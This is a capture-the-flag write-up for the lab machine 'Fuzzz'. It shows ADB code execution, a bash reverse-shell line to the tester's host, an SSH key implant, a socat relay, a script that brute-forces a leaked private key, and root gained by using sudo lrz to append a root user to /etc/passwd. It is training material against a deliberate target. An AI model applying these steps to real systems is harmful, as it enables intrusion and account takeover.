# Fuzzz

## Recon

```bash
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.24 # Last should be our target
```

::: details nmap_scan.log
```log
Open 10.0.2.24:22
Open 10.0.2.24:5555
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.24

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 b6:7b:e7:e5:b3:33:c7:ff:db:63:5d:b3:75:0d:e2:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMn+ANUyHwmNWHCBCNEevXEDdony9CC/L/mswWy2QPfo6dGeYVo2nr5m31TOVyka83Rip8dkEifkNqU6gWkXezQ=
|   256 0a:ce:e5:c3:de:50:9c:6d:b7:0d:de:73:b8:6c:28:55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKWBvhip783XnDTvLFztqGGwoe7JnTYbc6dvpjTarJg
5555/tcp open  adb     syn-ack Android Debug Bridge (token auth required)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel
```
:::

::: info Note
I added `fuzzz.hmv` as DNS record for simplicity.
:::

## ADB (5555)

[ADB (Android Debug Bridge)](https://hackviser.com/tactics/pentesting/services/adb)

Install some tools
```bash
└─$ sudo apt install adb -y
└─$ pipx install git+https://github.com/EntySec/Ghost
```

With `ghost` we have code execution
```bash
└─$ ghost
(ghost)> connect fuzzz.hmv:5555
[*] Connecting to fuzzz.hmv...
[+] Connected to fuzzz.hmv!

[i] Type devices to list all connected devices.
[i] Type interact 0 to interact this device.
(ghost)> interact 0
[*] Interacting with device 0...
[+] Interactive connection spawned!

[*] Loading device modules...
[i] Modules loaded: 13
(ghost: fuzzz.hmv)> shell id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

No bash, so we can't use the usual reverse shell payload
```bash
(ghost: fuzzz.hmv)> shell "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'"
/bin/sh: /bin/bash: not found
```

## SSH (22)

`runner` is a user, not a service. SSH is running so we can use that as entrypoint.
```bash
(ghost: fuzzz.hmv)> shell "ls -alh /home"
total 16K
drwxr-xr-x    4 root     root        4.0K May 19 10:02 .
drwxr-xr-x   21 root     root        4.0K May 19 08:45 ..
drwx------    3 asahi    asahi       4.0K May 19 13:16 asahi
drwx------    2 runner   runner      4.0K May 19 09:08 runner

(ghost: fuzzz.hmv)> shell "ls -alh /home/runner"
total 8K
drwx------    2 runner   runner      4.0K May 19 09:08 .
drwxr-xr-x    4 root     root        4.0K May 19 10:02 ..
lrwxrwxrwx    1 root     runner         9 May 19 09:08 .ash_history -> /dev/null
```

Generate keys
```bash
└─$ ssh-keygen -f id_rsa -q -P x
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPdCiNCmsQqwqvnYLi1kD1aZp+YKcbZo3AjR6Td3nPH+ woyag@kraken
```

Upload and verify
```bash
(ghost: fuzzz.hmv)> shell "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPdCiNCmsQqwqvnYLi1kD1aZp+YKcbZo3AjR6Td3nPH+ woyag@kraken' > /home/runner/.ssh/authorized_keys"
(ghost: fuzzz.hmv)> shell cat /home/runner/.ssh/*
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPdCiNCmsQqwqvnYLi1kD1aZp+YKcbZo3AjR6Td3nPH+ woyag@kraken
```

Login
```bash
└─$ ssh runner@fuzzz.hmv -i id_rsa
Warning: Permanently added 'fuzzz.hmv' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': x

fuzzz:~$ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

### HTTP (80)

There's an HTTP server which is owned by `asahi`, however if we try to request files we can't?
```bash
fuzzz:/etc/sysctl.d$ cd /opt
fuzzz:/opt$ ls -alh
total 12K
drwxr-xr-x    3 root     root        4.0K May 19 10:32 .
drwxr-xr-x   21 root     root        4.0K May 19 08:45 ..
drwx------    2 asahi    asahi       4.0K May 20 13:39 webapp

fuzzz:/opt$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN
tcp        0     36 10.0.2.24:22            10.0.2.15:43414         ESTABLISHED
tcp        0      0 :::22                   :::*                    LISTEN
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  3      [ ]         STREAM     CONNECTED      15966
unix  2      [ ]         STREAM     CONNECTED      15961
unix  3      [ ]         STREAM     CONNECTED      15965
unix  2      [ ]         DGRAM      CONNECTED       2862
unix  3      [ ]         DGRAM      CONNECTED       2844 /dev/log
fuzzz:/opt$ curl 0
-sh: curl: not found
fuzzz:/opt$ wget 0
Connecting to 0 (0.0.0.0:80)
wget: can't open 'index.html': Permission denied
```

### Port Forwarding

Port forward their 80 to our 8000
```bash
└─$ ssh runner@fuzzz.hmv -i id_rsa -L 8000:0:80
```

Connection just hangs without any response. 
```bash
└─$ curl 0:8000 -i
curl: (56) Recv failure: Connection reset by peer
---
fuzzz:~$ channel 3: open failed: administratively prohibited: open failed
channel 3: open failed: administratively prohibited: open failed
```

I was not able to interact with webapp using SSH and turns out TCP Forwarding is disabled...
```bash
fuzzz:~$ cat /etc/ssh/sshd_config | grep -vE '#|^$'
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin yes
AuthorizedKeysFile      .ssh/authorized_keys
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
Subsystem       sftp    internal-sftp
```

I thought about using **[chisel](https://github.com/jpillora/chisel)**, but [socat](https://linux.die.net/man/1/socat) is simpler. Download static binary and upload
```bash
└─$ curl https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64 -sLo socat
└─$ py -m http.server 80
---
└─$ ssh -i id_rsa runner@fuzzz.hmv
fuzzz:~$ cd /tmp
fuzzz:/tmp$ wget 10.0.2.15/socat
fuzzz:/tmp$ chmod +x socat
fuzzz:/tmp$ /tmp/socat TCP-LISTEN:8000,fork,reuseaddr TCP:127.0.0.1:80 &
```

We don't exactly do Port Forwarding, but rather open that port so other machines can interact with it.
```bash
└─$ curl fuzzz.hmv:8000/ -i
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0

└─$ curl fuzzz.hmv:8000/x -i
HTTP/1.1 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 207

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

```bash
└─$ ffuf -u "http://fuzzz.hmv:8000/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fs 207
line                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
:: Progress: [4727/4727] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

└─$ for i in {1..100}; do echo "line$i"; done > lines.txt
└─$ ffuf -u "http://fuzzz.hmv:8000/FUZZ" -w lines.txt -mc all -fs 207
line1                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 14ms]
line4                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
line5                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
line2                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
line3                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 46ms]

└─$ ffuf -u "http://fuzzz.hmv:8000/line/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fs 207
b                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]

└─$ ffuf -u "http://fuzzz.hmv:8000/line/bFUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fs 207
3                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
```

Fuzz
```python
import asyncio
from aiohttp import ClientSession
from aiohttp.client_exceptions import ServerDisconnectedError
import string

TARGET = "http://fuzzz.hmv:8000"
CHARS = string.ascii_letters + string.digits + '=+/'

async def fetch(session, url, retries=3):
    for _ in range(retries):
        try:
            async with session.get(url) as resp:
                if resp.status == 200:
                    return resp
        except ServerDisconnectedError:
            await asyncio.sleep(0.01)
        
    return False


async def bruteforce_line(session, line):
    path = ''
    while True:
        tasks = [
            asyncio.create_task(fetch(session, f"{TARGET}/{line}/{path}{char}"))
            for char in CHARS
        ]

        found = False
        for task in asyncio.as_completed(tasks):
            result = await task
            if result:
                path += str(result.url)[-1]
                print(f"\r[FOUND] {result.url}", end='', flush=True)
                found = True
                break

        for t in tasks:
            if not t.done():
                t.cancel()

        if not found:
            print(f"\n[DONE] Completed line: {line}")
            break
        
    return path

async def main():
    lines = [f'line{i}' for i in range(1, 6)]

    async with ClientSession() as session:
        with open('id_rsa.asahi', 'w') as f:
            f.write('-----BEGIN OPENSSH PRIVATE KEY-----\n')
            for line in lines:
                line = await bruteforce_line(session, line)
                f.write(line + '\n')
            f.write('-----END OPENSSH PRIVATE KEY-----\n')
        print("[COMPLETE] Finished writing id_rsa.asahi")
        
if __name__ == "__main__":
    asyncio.run(main())
```

::: info Note
After bruteforcing the first line charset seemed to be from Base64 
:::

```bash
[FOUND] http://fuzzz.hmv:8000/line1/b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[DONE] Completed line: line1
[FOUND] http://fuzzz.hmv:8000/line2/QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
[DONE] Completed line: line2
[FOUND] http://fuzzz.hmv:8000/line3/XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
[DONE] Completed line: line3
[FOUND] http://fuzzz.hmv:8000/line4/AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
[DONE] Completed line: line4
[FOUND] http://fuzzz.hmv:8000/line5/5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
[DONE] Completed line: line5
[COMPLETE] Finished writing id_rsa.asahi
```

The output is gibberish in plaintext, but it's actually a private key for `asahi` user. The script has been adjusted to output as such.
```bash
└─$ echo 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' | base64 -di | strings
base64: invalid input
openssh-key-v1
none
none
ssh-e
```

## SSH (asahi)

```bash
└─$ file id_rsa.asahi
id_rsa.asahi: OpenSSH private key
└─$ chmod 600 id_rsa*
└─$ ssh -i id_rsa.asahi asahi@fuzzz.hmv
fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$ md5sum user.flag
743fb57b79ddcc0957c34c06feff485c  user.flag
```

## Privilege Escalation (root)

```bash
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

`lrz` is the **receive-side tool of the lrzsz suite**, which implements the old **ZMODEM/YMODEM/XMODEM file transfer protocols** (used in the days of serial lines, BBSes, and early remote shells to push/pull files).
```bash
fuzzz:~$ lrz --help
lrz version 0.12.21rc
Usage: lrz [options] [filename.if.xmodem]
Receive files with ZMODEM/YMODEM/XMODEM protocol
    (X) = option applies to XMODEM only
    (Y) = option applies to YMODEM only
    (Z) = option applies to ZMODEM only
  -+, --append                append to existing files
  ...
  -C, --allow-remote-commands allow execution of remote commands (Z)
  ...
      --tcp-server            open socket, wait for connection (Z)
      --tcp-client ADDR:PORT  open socket, connect to ... (Z)
  ...
  -y, --overwrite             Yes, clobber existing file if any
      --ymodem                use YMODEM protocol
  -Z, --zmodem                use ZMODEM protocol

```

- [rx, rb, rz - XMODEM, YMODEM, ZMODEM (Batch) file receive](https://linux.die.net/man/1/rz)
- [sx, sb, sz - XMODEM, YMODEM, ZMODEM file send](https://linux.die.net/man/1/sz)

I began experimenting with Command Execution, but nothing worked. Also `tcp-(server,client)` option helped, otherwise the process would hang forever.
```bash
fuzzz:~$ sudo lrz -Z -C --tcp-server
connect with lrz --tcp-client "fuzzz.hmv:36533"
lrz waiting to receive.fuzzz:~$ ls /tmp
socat
---
└─$ sz --tcp-client "fuzzz.hmv:36533" -i "id > /tmp/pwned" --zmodem
connecting to [fuzzz.hmv] <36533>
```

Since the main purpose of this software is file upload let's do that. We can use `--append` mode to add contents to files. Create fake `/etc/passwd` record and add it to victim's file.
```bash
fuzzz:~$ head -1 /etc/passwd
root:x:0:0:root:/root:/bin/sh
---
└─$ echo "letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/sh" > passwd
---
fuzzz:~$ cd /etc
fuzzz:/etc$ sudo lrz --tcp-server
connect with lrz --tcp-client "fuzzz.hmv:43639"
---
└─$ sz --tcp-client "fuzzz.hmv:43639" --append ./passwd
---
fuzzz:/etc$ tail -1 passwd
letmein:$6$sULx5VBOy.N7hCBI$885esUgsx5AuWjMuZx64TJeFyWVX09SoDbtxj.T0ta6mFPMxRXrNdM6WIKTTTxZ9DAsedV6K.Pqk.tQIDNdpd/:0:0:letmein:/root:/bin/sh

fuzzz:/etc$ su - letmein
Password: Password123$
fuzzz:~# id
uid=0(root) gid=0(root) groups=0(root)

fuzzz:~# md5sum root.flag
d6b0e02f3c477615afe95966d35762b7  root.flag
```

AFAIK for upload to work properly you have to be in correct directory as upload is done in CWD, didn't test absolute paths.

